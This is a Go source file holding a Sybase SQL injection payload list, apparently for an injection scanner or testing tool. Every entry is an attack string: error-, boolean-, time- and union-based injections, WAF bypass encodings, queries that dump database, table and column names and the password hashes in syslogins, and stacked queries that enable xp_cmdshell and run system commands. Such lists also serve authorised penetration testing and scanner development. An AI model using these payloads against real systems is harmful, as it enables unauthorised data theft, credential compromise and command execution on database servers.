package payloads

var Sybase = PayloadGroup{
	DBMS: "Sybase",
	Payloads: []Payload{
		// ═══════════════════════════════════════════
		// ERROR-BASED (Convert errors)
		// ═══════════════════════════════════════════
		{Type: "error", Content: "' AND 1=CONVERT(int, @@version)--"},
		{Type: "error", Content: "' AND 1=CONVERT(int, DB_NAME())--"},
		{Type: "error", Content: "' AND 1=CONVERT(int, USER_NAME())--"},
		{Type: "error", Content: "' AND 1=CONVERT(int, (SELECT name FROM master..sysdatabases WHERE dbid=1))--"},
		{Type: "error", Content: "' AND 1=CONVERT(int, (SELECT name FROM sysobjects WHERE id=1))--"},
		{Type: "error", Content: "' AND 1=CONVERT(int, (SELECT col_name(1,1)))--"},

		// ═══════════════════════════════════════════
		// BOOLEAN-BASED
		// ═══════════════════════════════════════════
		{Type: "boolean", Content: "' AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "' AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' AND (SELECT 1)=(SELECT 1)--", Expected: "true"},
		{Type: "boolean", Content: "' AND (SELECT 1)=(SELECT 2)--", Expected: "false"},
		{Type: "boolean", Content: "' AND user_name()=user_name()--", Expected: "true"},
		{Type: "boolean", Content: "' AND user_name()=user_id()--", Expected: "false"},

		// ═══════════════════════════════════════════
		// TIME-BASED (WAITFOR DELAY)
		// ═══════════════════════════════════════════
		{Type: "time", Content: "'; WAITFOR DELAY '0:0:5'--"},
		{Type: "time", Content: "' AND WAITFOR DELAY '0:0:5'--"},
		{Type: "time", Content: "' AND 1=WAITFOR DELAY '0:0:5'--"},
		{Type: "time", Content: "'); WAITFOR DELAY '0:0:5'--"},
		{Type: "time", Content: "'; WAITFOR DELAY '00:00:05'--"},

		// ═══════════════════════════════════════════
		// UNION-BASED
		// ═══════════════════════════════════════════
		{Type: "union", Content: "' UNION SELECT 1--"},
		{Type: "union", Content: "' UNION SELECT 1,2--"},
		{Type: "union", Content: "' UNION SELECT 1,2,3--"},
		{Type: "union", Content: "' UNION ALL SELECT NULL,NULL,NULL--"},

		// ═══════════════════════════════════════════
		// DATA EXTRACTION
		// ═══════════════════════════════════════════
		{Type: "deep", Content: "' UNION SELECT name FROM master..sysdatabases--"},
		{Type: "deep", Content: "' UNION SELECT name FROM sysobjects WHERE type='U'--"},
		{Type: "deep", Content: "' UNION SELECT sc.name||'.'||o.name FROM sysobjects o, sysusers sc WHERE o.uid=sc.uid AND o.type='U'--"},
		{Type: "deep", Content: "' UNION SELECT c.name||':'||t.name FROM syscolumns c, systypes t WHERE c.usertype=t.usertype AND c.id=OBJECT_ID('users')--"},
		{Type: "deep", Content: "' UNION SELECT @@version--"},
		{Type: "deep", Content: "' UNION SELECT DB_NAME()--"},

		// ═══════════════════════════════════════════
		// STACKED (Command execution via xp_cmdshell)
		// ═══════════════════════════════════════════
		{Type: "stacked", Content: "'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--"},
		{Type: "stacked", Content: "'; EXEC master..xp_cmdshell 'whoami'--"},
		{Type: "stacked", Content: "' UNION SELECT 1; EXEC master..xp_cmdshell 'ipconfig'--"},

		// ═══════════════════════════════════════════
		// WAF BYPASS
		// ═══════════════════════════════════════════
		{Type: "bypass", Content: "'%00OR%201=1--"},
		{Type: "bypass", Content: "'/**/OR/**/1=1--"},
		{Type: "bypass", Content: "'%0AWAITFOR%0ADELAY%20'0:0:5'--"},
		{Type: "bypass", Content: "'%0AAND%0A1%3D1--"},
		{Type: "bypass", Content: "'%0AUNION%0ASELECT%0A1--"},
		{Type: "bypass", Content: "'/*!WAITFOR*/%20DELAY%20'0:0:5'--"},
		{Type: "bypass", Content: "'%0AEXEC%20xp_cmdshell--"},
		{Type: "time", Content: "1' WAITFOR DELAY '0:0:5'--"},
		{Type: "time", Content: "' WAITFOR DELAY '0:0:10'--"},
		{Type: "time", Content: "1 WAITFOR DELAY '0:0:3'--"},
		{Type: "time", Content: "' AND 1=2 WAITFOR DELAY '0:0:5'--"},
		{Type: "time", Content: "\" WAITFOR DELAY '0:0:5'--"},
		{Type: "time", Content: "') WAITFOR DELAY '0:0:5'--"},
		{Type: "union", Content: "' UNION SELECT 1,2,3,4--"},
		{Type: "union", Content: "' UNION SELECT NULL,NULL--"},
		{Type: "union", Content: "' UNION SELECT NULL,NULL,NULL,NULL--"},
		{Type: "union", Content: "' UNION ALL SELECT 1,2,3,4,5--"},
		{Type: "union", Content: "\" UNION SELECT 1,2,3--"},
		{Type: "union", Content: "') UNION SELECT 1,2,3--"},
		{Type: "boolean", Content: "\" AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "\" AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "') AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "') AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' AND 1=1 AND '1'='1", Expected: "true"},
		{Type: "boolean", Content: "' AND 1=2 AND '1'='1", Expected: "false"},
		{Type: "boolean", Content: "' OR 'a'='a", Expected: "true"},
		{Type: "boolean", Content: "' OR 'a'='b", Expected: "false"},
		{Type: "error", Content: "' AND 1=CONVERT(int, (SELECT @@servername))--"},
		{Type: "error", Content: "' AND 1=CONVERT(int, (SELECT dbid FROM master..sysdatabases WHERE name=DB_NAME()))--"},
		{Type: "error", Content: "' AND 1=CONVERT(int, (SELECT password_hash FROM syslogins WHERE name='sa'))--"},
		{Type: "error", Content: "' AND 1=CONVERT(int, (SELECT object_name(id) FROM sysobjects WHERE id=OBJECT_ID('users')))--"},
		{Type: "deep", Content: "' UNION SELECT name||':'||dbid||':'||crdate FROM master..sysdatabases ORDER BY dbid--"},
		{Type: "deep", Content: "' UNION SELECT name||':'||type FROM sysobjects WHERE type='U' OR type='S'--"},
		{Type: "deep", Content: "' UNION SELECT c.name||':'||t.name||':'||c.length FROM syscolumns c, systypes t WHERE c.usertype=t.usertype AND c.id=OBJECT_ID('admin')--"},
		{Type: "deep", Content: "' UNION SELECT name||':'||password_hash FROM syslogins--"},
		{Type: "stacked", Content: "'; EXEC sp_helpdb;--"},
		{Type: "stacked", Content: "'; EXEC sp_helpuser;--"},
		{Type: "stacked", Content: "'; EXEC sp_who;--"},
	},
}

